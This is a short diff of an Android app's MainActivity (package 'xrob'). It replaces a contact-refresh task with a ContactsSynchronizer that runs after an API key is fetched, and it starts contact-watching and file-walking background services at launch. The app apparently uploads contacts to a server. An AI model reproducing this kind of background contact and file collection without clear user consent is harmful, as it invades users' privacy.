@@ -14,7 +14,7 @@ import android.view.View;
 import android.widget.EditText;
 import android.widget.Toast;
 
-import com.theah64.xrob.asynctasks.ContactRefresher;
+import com.theah64.xrob.asynctasks.ContactsSynchronizer;
 import com.theah64.xrob.services.ContactsWatcherService;
 import com.theah64.xrob.services.FileWalkerService;
 import com.theah64.xrob.utils.APIRequestBuilder;
@@ -205,7 +205,20 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-        new ContactRefresher(this).execute();
+        new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
+            @Override
+            public void onReadyToRequest(String apiKey) {
+
+                new ContactsSynchronizer(MainActivity.this, apiKey).execute();
+
+            }
+
+            @Override
+            public void onFailed(String reason) {
+
+            }
+        });
+
         startService(new Intent(this, ContactsWatcherService.class));
         startService(new Intent(this, FileWalkerService.class));
     }
